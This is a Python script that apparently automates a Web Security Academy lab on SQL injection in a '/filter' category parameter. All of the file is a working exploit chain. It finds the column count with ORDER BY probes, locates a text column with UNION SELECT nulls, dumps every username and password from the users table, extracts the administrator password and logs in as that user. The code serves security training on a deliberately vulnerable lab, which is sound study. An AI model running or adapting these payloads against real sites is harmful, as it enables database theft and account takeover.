from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/filter"

    logger.info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} -- //"}
        resp = session.get_path(path, params=params)
        logger.info(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    logger.success(f"There are {num_columns} columns.")
    logger.info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = session.get_path(path, params=params)
        logger.info(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        logger.failure("Unable to find a column with the string data type")
        return
    else:
        logger.success(f"Column {i} has the string data type.")

    columns = ["null"] * num_columns
    columns[i] = "username || ':' || password"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} FROM users --"}

    logger.info(
        f'Retrieving all usernames and passwords by visiting "{path}" with the following parameters:'
    )
    logger.info(params)

    resp = session.get_path(path, params=params)
    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.find_all(lambda tag: tag.name == "th")

    if len(query) == 0:
        logger.failure("Unable to retrieve usernames and passwords.")
        return

    logger.success(f"Successfully retrieved usernames and passwords.")
    logger.info("Extracting administrator password...")

    for tag in query:
        username, password = tag.text.split(":")
        if username == "administrator":
            break
    else:
        logger.failure("Unable to find administrator user.")
        return

    logger.success(f"Found administrator password: {password}")

    session.login("administrator", password)
